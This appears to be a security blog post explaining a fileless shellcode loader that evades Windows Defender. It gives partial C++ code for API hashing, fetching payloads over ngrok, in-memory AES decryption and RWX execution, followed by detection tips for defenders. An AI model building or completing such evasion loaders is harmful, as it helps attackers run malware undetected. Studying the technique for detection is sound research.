---
slug: sneaky-shellcode-shenanigans
title: "Sneaky Shellcode Shenanigans: Windows Defender-Dodging Loader"
date: "2025-03-09"
description: "Deep dive into fileless shellcode loader evasion — API hashing, encrypted payloads, and direct syscalls. The research behind Beulah Intrusion."
category: security
tags: ["C++", "Windows", "Malware Research", "Detection"]
---

**Overview:** A deep technical breakdown of a fileless shellcode loader that bypasses Windows Defender through API hashing, encrypted payloads, and direct syscalls. This is the research behind my Beulah Intrusion project.

> **Ethical Use Only:** This research is for authorized security testing and education only. Malware development outside controlled environments is illegal. Always obtain proper authorization.

## The 5-Layer Evasion Stack

Modern endpoint protection requires modern evasion. This loader implements five complementary techniques that work together to evade detection:

| Layer | Technique | What It Evades |
|---|---|---|
| 1 | Fileless execution | Signature-based AV |
| 2 | API hashing | Import table analysis |
| 3 | Encrypted HTTPS fetch | Network inspection |
| 4 | AES decryption in-memory | Static payload analysis |
| 5 | Direct syscalls | User-mode EDR hooks |

## Layer 1: Fileless Execution

No payload touches disk. The shellcode is fetched over HTTPS, decrypted in memory, and executed directly from an allocated memory region. This bypasses any signature-based detection that relies on file scanning.

## Layer 2: API Hashing — Dynamic Resolution

Instead of importing suspicious functions like `NtAllocateVirtualMemory` directly, we hash function names and resolve them at runtime by walking the PE export table:

```cpp
FARPROC GetHashedFunction(const std::string& moduleName, 
                          const std::string& functionName) {
    HMODULE hModule = GetModuleHandleA(moduleName.c_str());
    auto hash = [](const std::string& str) {
        size_t hash = 5381;
        for (char c : str) {
            hash = ((hash << 5) + hash) + c;
        }
        return hash;
    };
    size_t targetHash = hash(functionName);
    // Scan export table for matching hash
}
```

**Why it works:** No "suspicious" imports appear in the IAT. EDRs that scan import tables miss the resolution entirely.

## Layer 3: Payload Fetch via HTTPS

The encrypted payload is fetched using WinHTTP from a ngrok tunnel URL. This provides TLS encryption and a dynamic, rotating endpoint:

```cpp
std::vector<uint8_t> downloadPayload(const std::wstring& url) {
    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", ...);
    // Parse URL, connect, send GET request
    return payload;
}
```

**Evasion:** Encrypted traffic blends with normal browser activity. Ngrok URLs rotate, evading static domain blocklists.

## Layer 4: AES Decryption In-Memory

The fetched payload starts with a 32-byte header (16-byte key + 16-byte IV), followed by AES-CBC encrypted shellcode:

```cpp
std::vector<uint8_t> decryptPayload(
    const std::vector<uint8_t>& encryptedData,
    const uint8_t* key, const uint8_t* iv) {
    
    AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, iv);
    std::vector<uint8_t> decrypted(encryptedData.size());
    memcpy(decrypted.data(), encryptedData.data(), encryptedData.size());
    AES_CBC_decrypt_buffer(&ctx, decrypted.data(), decrypted.size());
    return decrypted;
}
```

**Evasion:** No plaintext shellcode exists on disk or in static analysis.

## Layer 5: Direct Syscalls for Execution

Finally, we allocate RWX memory and execute using direct syscalls to bypass user-mode hooks:

```cpp
void executeShellcode(const std::vector<uint8_t>& shellcode) {
    auto NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)
        GetHashedFunction("ntdll.dll", "NtAllocateVirtualMemory");
    
    PVOID allocated_mem = nullptr;
    SIZE_T size = shellcode.size();
    
    NTSTATUS status = NtAllocateVirtualMemory(
        GetCurrentProcess(), &allocated_mem, 0, &size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    memcpy(allocated_mem, shellcode.data(), size);
    NtProtectVirtualMemory(..., PAGE_EXECUTE_READ, ...);
    ((void(*)())allocated_mem)();
}
```

## Defense Effectiveness Matrix

| Defense | Evasion Method | Result |
|---|---|---|
| Windows Defender | Fileless + API hashing | Bypassed in testing |
| EDR (User-mode hooks) | Direct syscalls | Partial evasion |
| Network IDS/IPS | TLS + ngrok tunnels | Strong evasion |

## Detection Opportunities

For defenders, here's what to look for:

- **Behavioral:** RWX memory allocation from non-standard processes
- **Network:** Ngrok domain connections from unexpected applications
- **Syscall monitoring:** Direct Nt* calls without corresponding user-mode API calls
- **ETW:** Windows Event Tracing can catch some syscall patterns

## Final Thoughts

This loader demonstrates why defense in depth matters. No single security control stops all attack vectors. The combination of fileless execution, API hashing, encrypted transport, and syscall abuse creates a formidable evasion chain.

For blue teams: Focus on behavioral detection, syscall monitoring, and network anomaly detection. Signature-based approaches will always lag behind.

> **Resources:** [GitHub Repository](https://github.com/ITEKONGIT/beulah_intrusion.git) (lab use only, redacted payloads)
